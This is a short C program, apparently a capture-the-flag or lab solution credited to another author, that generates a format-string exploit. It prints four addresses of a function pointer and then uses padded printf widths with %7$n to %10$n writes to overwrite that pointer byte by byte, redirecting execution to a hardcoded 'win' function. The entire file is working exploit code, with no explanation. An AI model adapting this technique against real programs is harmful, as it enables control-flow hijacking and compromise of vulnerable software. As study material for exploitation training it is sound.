// All intellectual credit to Vincent Moscatello https://github.com/quantumvm
// Declare unistd; implicit in example on sheepshellcode
#include <unistd.h>

int get_distance(int * start_number, uint8_t target){
    int u = 0;
    while( ((uint8_t) *start_number) != target){
        (*start_number)++;
        u++;
    }
    return u;
}

int main(){

    //address of function pointer. We can only overwrite 1 byte at a time.
    uint32_t byte_1 = 0x0804A060;
    uint32_t byte_2 = 0x0804A061;
    uint32_t byte_3 = 0x0804A062;
    uint32_t byte_4 = 0x0804A063;

    write(1, &byte_1, 4);
    write(1, &byte_2, 4);
    write(1, &byte_3, 4);
    write(1, &byte_4, 4);

    //our byte count starts at 0x10 (from byte_1, byte_2â€¦)
    int count = 0x10;


    //WIN FUNCTION LOCATION: 0x08048501

    //01
    int d = get_distance(&count, '\x01');
    printf("%%%du",d);
    fflush(stdout);
    write(1,"%7$n",4);

    //85
    d = get_distance(&count, '\x85');
    printf("%%%du",d);
    fflush(stdout);
    write(1,"%8$n",4);

    //04
    d = get_distance(&count, '\x04');
    printf("%%%du",d);
    fflush(stdout);
    write(1,"%9$n",4);

    //08
    d = get_distance(&count, '\x08');
    printf("%%%du",d);
    fflush(stdout);
    write(1,"%10$n",5);


}
